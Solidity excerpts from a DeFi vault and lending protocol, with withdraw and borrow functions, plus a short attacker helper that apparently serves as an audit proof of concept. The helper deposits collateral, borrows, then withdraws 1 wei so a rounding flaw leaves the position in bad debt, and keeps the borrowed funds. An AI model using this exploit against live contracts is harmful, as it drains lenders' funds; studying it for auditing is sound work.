function withdrawExactShares(
    uint256 _shares
)
    external
    syncSupply
    returns (uint256)
{
    if (_shares == 0) {
        revert ZeroAmount();
    }

    if (_shares > balanceOf(msg.sender)) {
        revert InsufficientShares();
    }

    uint256 tokenAmount = previewAmountWithdrawShares(
        _shares,
        underlyingLpAssetsCurrent
    );

    underlyingLpAssetsCurrent -= tokenAmount;

    _burn(
        msg.sender,
        _shares
    );

    if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {
        return tokenAmount;
    }

    _withdrawLp(
        msg.sender,
        tokenAmount
    );

    return tokenAmount;
}

    function withdrawExactAmount(
        uint256 _underlyingLpAssetAmount
    )
        external
        syncSupply
        returns (uint256)
    {
        if (_underlyingLpAssetAmount == 0) {
            revert ZeroAmount();
        }

        uint256 shares = previewBurnShares(
            _underlyingLpAssetAmount,
            underlyingLpAssetsCurrent
        );

        if (shares > balanceOf(msg.sender)) {
            revert NotEnoughShares();
        }

        _burn(
            msg.sender,
            shares
        );

        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount;

        _withdrawLp(
            msg.sender,
            _underlyingLpAssetAmount
        );

        return shares;
    }
}

function borrow(IERC20 asset, uint256 collateralAmount, uint256 debtAmount) external {
    uint256 positionId = PositionNFTs.mintPosition();
    LPTPoolToken.approve(address(wiseLending), type(uint256).max);
    wiseLending.depositExactAmount(positionId, address(LPTPoolToken), collateralAmount); // deposit collateral
    wiseLending.borrowExactAmount(positionId, address(asset), debtAmount); // borrow asset

    // withdraw 1 wei collateral, burn 1 share, donate (sharePrice - 1) wei collateral to the pool, forced position entered into bad debt
    wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1);

    asset.transfer(msg.sender, asset.balanceOf(address(this)));
    LPTPoolToken.transfer(msg.sender, LPTPoolToken.balanceOf(address(this)));
}

function borrowExactAmount(
    uint256 _nftId,
    address _poolToken,
    uint256 _amount
)
    external
    syncPool(_poolToken)
    returns (uint256)
{
    _checkOwnerPosition(
        _nftId,
        msg.sender
    );

    uint256 shares = calculateBorrowShares(
        {
            _poolToken: _poolToken,
            _amount: _amount,
            _maxSharePrice: true
        }
    );

    _coreBorrowTokens(
        {
            _caller: msg.sender,
            _nftId: _nftId,
            _poolToken: _poolToken,
            _amount: _amount,
            _shares: shares,
            _onBehalf: false
        }
    );

    _safeTransfer(
        _poolToken,
        msg.sender,
        _amount
    );

    return shares;
}

